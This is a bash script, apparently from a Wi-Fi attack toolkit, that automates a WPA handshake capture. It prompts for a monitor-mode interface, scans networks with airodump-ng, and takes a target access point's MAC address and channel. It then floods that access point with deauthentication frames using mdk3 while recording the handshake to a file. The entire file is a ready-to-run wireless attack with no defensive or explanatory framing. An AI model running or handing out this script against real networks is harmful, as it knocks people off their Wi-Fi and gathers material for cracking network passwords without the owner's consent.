#!/bin/bash

source "assets/variables.sh"
source "assets/functions.sh"

clear && echo -en "\\033]0;$ScriptName | $ScriptVersion\\a"

echo -e "\n Made With Love by $ScriptAuthor "

check_root
check_bash

echo -e "\n ------------------------------------- "
echo -en "\n Press [ENTER] to continue ... "
read -r continue

clear

echo -e "\n       These Are The Networks Interfaces You Have "
echo -e " You Need To Use An Interface With \e[4mMonitor Mode\e[0m Enabled \n"

echo -en "\e[0;33m"
ip -o link show | awk -F': ' '{print $2}'
echo -en "\e[0m"

echo -en "\n Enter The Interface You Want To Use >> "
read -r interface

check_monitor

clear

xterm -geometry 100x25 -e "sudo airodump-ng $interface" &
processidxterm=$!

echo -en "\n Enter The Mac Address You Want To Deauth >> "
read -r macadd

cat >"${tmp}bl.txt" <<-EOF
  $macadd
EOF

clear

echo -en "\n Enter The Channel You Want to Use >> "
read -r channel

kill $processidxterm

echo " Capturing HandShake "

mdk3 "$interface" d -b "${tmp}bl.txt" -c "$channel" &
processidattack=$!

airodump-ng -c "$channel" -d "$macadd" -w "${tmp}HandShake" "$interface" &
processidcapture=$!

sleep 12 && kill $processidattack
sleep 12 && kill $processidcapture

clear

echo -en "\n Did You Get The HandShake ?  "
read -r yesno

if [[ $yesno = "y" ]] || [[ $yesno = "yes" ]] || [[ $yesno = "Y" ]] || [[ $yesno = "YES" ]]; then
  clear
  echo -e "\n Awesome ! Script Will Close Now ... "
  sudo rm -rf "${tmp}bl.txt" > /dev/null 2>&1
  exit
else
  clear
  echo -e "\n Sorry To See That... :( \n Please Try Again ! "
  exit
fi
